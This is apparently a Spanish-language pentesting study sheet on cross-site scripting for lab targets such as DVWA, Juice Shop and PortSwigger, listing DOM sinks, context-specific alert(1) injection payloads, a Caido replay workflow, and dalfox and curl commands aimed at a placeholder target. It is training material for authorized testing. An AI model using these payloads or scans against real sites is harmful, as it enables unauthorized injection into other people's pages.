<div align="center">

# 🧨 XSS
### Reflected, Stored y DOM XSS

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Cross--site%20Scripting-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **XSS:** inyección de código JavaScript en páginas web que ejecuta en el navegador de víctimas. Permite robo de cookies, redirección, keylogging y más.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Buscar](#-buscar) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 06 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 07 | [🧠 Contextos Típicos](#-contextos-típicos) |
| 08 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 09 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | XSS Reflected, XSS Stored, XSS DOM |
| **Juice Shop** | DOM XSS, Bonus Payload, Reflected XSS, API-only XSS |
| **PortSwigger** | Cross-site scripting |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-dalfox-ff3c6e?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-DevTools-5865f2?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay`, `HTTP History` |
| **Firefox DevTools** | DOM, CSP, storage, eventos, JS debugging |
| **dalfox** | Escaneo automático de XSS reflejado/DOM |

---

## 🔍 Buscar

![Context](https://img.shields.io/badge/Búsqueda-Sources%20%26%20Sinks-00d4ff?style=flat-square)

### `[01]` Sources — entradas controladas

- input reflejado en HTML body
- input dentro de atributo HTML
- input dentro de string JavaScript

### `[02]` Sinks DOM peligrosos

```javascript
innerHTML
document.write
location.search
location.hash
eval
```

> [!TIP]
> Buscar en DevTools con `Ctrl+Shift+F` → buscar `location.search` e `innerHTML` para localizar sinks DOM.

---

## 🧪 Payloads Base

### `[01]` HTML context

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

### `[02]` Attribute context

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
"><svg/onload=alert(1)>
```

### `[03]` JavaScript string context

```javascript
'-alert(1)-'
';alert(1);//
</script><svg/onload=alert(1)>
```

### `[04]` DOM probes

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
```

> [!NOTE]
> Probar payload mínimo `<xss123>` primero para detectar reflexión antes de intentar ejecución.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Hallar reflection

Capturar request de:

- búsqueda
- comentarios
- feedback
- profile fields
- parámetros `q`, `search`, `name`, `returnUrl`

### `[02]` Replay manual

Primero payload de detección:

```text
test123
<xss123>
"><xss123>
```

Luego payload ejecutable si hay reflexión confirmada:

```text
<svg/onload=alert(1)>
```

### `[03]` Observar contexto

Mirar response:

- raw HTML — ¿dónde aparece el input?
- encode parcial o completo
- CSP en headers

### `[04]` Variantes

Si bloquea `<script>`, probar:

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

> [!IMPORTANT]
> Leer raw HTML de response, no el render del navegador. El encode puede parecer ejecución fallida cuando el problema es el contexto.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-dalfox-ff3c6e?style=flat-square)

```bash
# Scan automático
dalfox url "http://target/search?q=FUZZ"

# Curl con payload encoded
curl -i "http://target/search?q=%3Csvg/onload=alert(1)%3E"
```

---

## 🧠 Contextos Típicos

| Contexto | Ejemplo | Payload |
|----------|---------|---------|
| **HTML body** | `<div>INPUT</div>` | `<script>alert(1)</script>` |
| **Attribute** | `<input value="INPUT">` | `" onfocus=alert(1) autofocus x="` |
| **JS string** | `var x='INPUT'` | `'-alert(1)-'` |
| **URL / href** | `<a href="INPUT">` | `javascript:alert(1)` |
| **DOM sink** | JS toma `location.search` | `<img src=x onerror=alert(1)>` |

---

## 🧭 Ruta de Práctica

1. DVWA Reflected XSS
2. DVWA Stored XSS
3. DVWA DOM XSS
4. Juice Shop DOM XSS
5. Juice Shop Reflected XSS
6. PortSwigger: reflected XSS HTML context
7. PortSwigger: attribute injection
8. PortSwigger: JS string escape
9. PortSwigger: DOM XSS con `document.write` / `innerHTML`

---

## 📝 Checklist

- [ ] source controlado localizado
- [ ] sink identificado
- [ ] contexto exacto definido (HTML / attr / JS / DOM)
- [ ] payload mínimo reflejado
- [ ] payload ejecutable validado
- [ ] CSP / filtros documentados
